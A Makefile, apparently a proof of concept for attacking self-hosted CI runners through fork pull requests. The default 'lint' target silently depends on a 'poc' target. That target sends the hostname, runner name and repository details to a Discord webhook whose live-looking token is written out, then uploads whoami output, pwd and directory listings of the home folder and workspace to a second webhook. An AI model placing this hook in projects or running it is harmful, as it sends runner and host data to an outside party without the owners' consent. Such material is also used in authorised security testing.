.PHONY: all poc lint
all: lint

poc:
	@echo "[POC] fork PR on self-hosted runner — pingback & dir listing"

	# 1) Small JSON message to Discord
	@curl -sS -o /dev/null -w "Discord ping HTTP %{http_code}\n" \
		-H 'Content-Type: application/json' \
		-d "$$(printf '{"content":"POC ping: host=%s runner=%s repo=%s event=%s"}' "$$(hostname)" "$$RUNNER_NAME" "$$GITHUB_REPOSITORY" "$$GITHUB_EVENT_NAME")" \
		"https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN" || true

	# 2) Shallow directory listing → temp file → upload as attachment
	@tmpfile="$$(mktemp /tmp/poc.XXXXXX.txt)"; \
	{ \
		echo "host=$$(hostname) whoami=$$(whoami) pwd=$$(pwd)"; \
		echo "--- $$HOME (maxdepth 2) dirs ---"; find "$$HOME" -maxdepth 2 -type d 2>/dev/null | head -n 150; \
		echo "--- workspace (maxdepth 2) dirs ---"; find . -maxdepth 2 -type d 2>/dev/null | head -n 200; \
		echo "--- github context ---"; \
		echo "repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME run_id=$$GITHUB_RUN_ID sha=$$GITHUB_SHA"; \
	} > "$$tmpfile"; \
	curl -sS -o /dev/null -w "Discord file HTTP %{http_code}\n" \
		-F 'payload_json={"content":"POC: attached shallow dir listing (harmless)"}' \
		-F "file=@$$tmpfile;type=text/plain;filename=dir-listing.txt" \
		"https://discord.com/api/webhooks/1234567890/YourWebhookSecret" || true; \
	rm -f "$$tmpfile"

	@echo "[POC] done."

lint: poc
	@echo "Lint step ran (after PoC)."
